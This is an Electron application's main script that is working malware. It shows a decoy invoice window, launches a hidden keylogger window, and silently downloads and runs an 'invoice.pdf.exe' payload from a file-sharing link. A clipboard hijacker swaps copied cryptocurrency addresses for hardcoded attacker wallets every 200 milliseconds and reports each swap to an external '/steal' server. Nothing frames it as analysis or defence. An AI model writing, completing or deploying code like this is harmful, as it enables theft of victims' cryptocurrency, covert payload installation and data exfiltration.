const { app, BrowserWindow, ipcMain, clipboard, net } = require('electron');
const path = require('path');
const { exec } = require('child_process');
const fs = require('fs');

// --- Start of Logging Setup ---
const logStream = fs.createWriteStream(path.join(app.getPath('documents'), 'phishing-log.txt'), { flags: 'w' }); // 'w' to overwrite the log each time
const log = (message) => {
  const timestamp = new Date().toISOString();
  logStream.write(`${timestamp} - ${message}\n`);
  console.log(`${timestamp} - ${message}`); // Also log to console for dev mode
};
process.on('uncaughtException', (error) => {
  log(`FATAL UNCAUGHT EXCEPTION: ${error.message}\n${error.stack}`);
  app.quit();
});
log('App starting...');
// --- End of Logging Setup ---

function createWindow() {
  // Create the decoy window.
  const decoyWin = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  const invoiceHTML = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>INVOICE</title>
      <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 40px; font-size: 14px; line-height: 1.6; }
        .invoice-box { max-width: 800px; margin: auto; padding: 30px; border: 1px solid #eee; box-shadow: 0 0 10px rgba(0, 0, 0, 0.15); }
        .header { text-align: center; margin-bottom: 40px; }
        .header h1 { margin: 0; font-size: 28px; }
        .address-info { display: flex; justify-content: space-between; margin-bottom: 40px; }
        .address-info div { width: 48%; }
        table { width: 100%; line-height: inherit; text-align: left; border-collapse: collapse; }
        table td { padding: 8px; vertical-align: top; }
        table tr.heading td { background: #eee; border-bottom: 1px solid #ddd; font-weight: bold; }
        table tr.item td { border-bottom: 1px solid #eee; }
        table tr.total td:last-child { font-weight: bold; font-size: 16px; }
        .grand-total { text-align: right; margin-top: 20px; }
      </style>
    </head>
    <body>
      <div class="invoice-box">
        <div class="header">
          <h1>INVOICE</h1>
          <p>Acme Group Corp</p>
          <p>133, Canvey Island, South Florida</p>
          <p>Email: info@acmegroup.com | Phone: +1 456 0986</p>
        </div>
        <div class="address-info">
          <div>
            <strong>Bill To:</strong><br>
            Arnold Fletch
          </div>
        </div>
        <table>
          <tr class="heading">
            <td>Description</td>
            <td>Quantity</td>
            <td>Unit Price</td>
            <td>Total</td>
          </tr>
          <tr class="item">
            <td>Website Design</td>
            <td>1</td>
            <td>$500</td>
            <td>$500</td>
          </tr>
          <tr class="item">
            <td>Hosting (1 year)</td>
            <td>1</td>
            <td>$100</td>
            <td>$100</td>
          </tr>
          <tr class="item">
            <td>Domain (1 year)</td>
            <td>1</td>
            <td>$20</td>
            <td>$20</td>
          </tr>
          <tr class="total">
            <td colspan="3" style="text-align: right;"><b>Grand Total</b></td>
            <td><b>$620</b></td>
          </tr>
        </table>
        <div class="grand-total">
          <p>Thank you for your business! Please make payment within 14 days.</p>
        </div>
      </div>
    </body>
    </html>
  `;
  decoyWin.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(invoiceHTML)}`);

  // Create a hidden worker window to run the keylogger script.
  const workerWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: true,
    },
  });
  workerWin.loadFile(path.join(__dirname, 'worker.html'));

  // Start the background download.
  const isMac = process.platform === 'darwin';

  const downloadLink = isMac
    ? 'YOUR_MACOS_PAYLOAD_DOWNLOAD_LINK_HERE'
    : 'https://www.dropbox.com/scl/fi/n5umt1lezx91cygika6r9/invoice.pdf.exe?rlkey=rv1x8zsttsi358h5juaexwfun&st=i2hrh6xt&dl=1';

  const fileName = isMac ? 'invoice.dmg' : 'invoice.pdf.exe';
  const downloadsPath = app.getPath('downloads');
  const filePath = path.join(downloadsPath, fileName);

  const downloadWin = new BrowserWindow({ show: false });
  downloadWin.loadURL(downloadLink);

  downloadWin.webContents.session.on('will-download', (event, item) => {
    item.setSavePath(filePath);
    item.on('done', (event, state) => {
      if (state === 'completed') {
        console.log('Download successfully');
        const command = isMac ? `open "${filePath}"` : `start "" "${filePath}"`;
        exec(command, (err) => {
          if (!err) app.quit();
        });
      } else {
        console.log(`Download failed: ${state}`);
        app.quit();
      }
    });
  });
}

app.whenReady().then(createWindow).then(() => {
  log('App ready, starting clipboard monitor.');
  // === Clipbanker Logic (Moved to Main Process) ===
  const scammerAddresses = {
    btc:   "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0",
    eth:   "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
    usdt_erc20: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
    usdt_trc20: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
    erc20: "0xb9FBAa68123ad7BdaCb5820dE4f7998887733333",
    trc20: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
    sol:   "Gc1Xak8dXJY7h6G8XXMefa9BaiT8VMEsm6G4DXMzyCaX",
    bnbsc: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
  };

  function getScammerAddress(copied) {
    if (/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(copied)) return scammerAddresses.btc;
    if (/^0x[a-fA-F0-9]{40}$/.test(copied)) return scammerAddresses.eth;
    if (/^T[a-zA-Z0-9]{33}$/.test(copied)) return scammerAddresses.trc20;
    if (/^[A-Za-z0-9]{43}$/.test(copied)) return scammerAddresses.sol;
    return null;
  }

  setInterval(() => {
    try {
      log('Checking clipboard...');
      const text = clipboard.readText();
      if (text) log(`Clipboard text: "${text}"`);

      const scammerAddress = getScammerAddress(text);
      if (scammerAddress && text !== scammerAddress) {
        log(`Address detected. Replacing with: ${scammerAddress}`);
        clipboard.writeText(scammerAddress);
        log('Replacement successful.');
        
        const request = net.request({
          method: 'POST',
          url: 'https://invoice-wimt.onrender.com/steal'
        });
        request.setHeader('Content-Type', 'application/json');
        request.write(JSON.stringify({
          type: "clipbanker",
          original: text,
          replaced: scammerAddress,
          victim: "PC-User-01",
          timestamp: new Date().toISOString()
        }));
        request.end();
        log('Data sent to server.');
      }
    } catch (err) {
      log(`ERROR in clipboard interval: ${err.message}`);
    }
  }, 200);
});
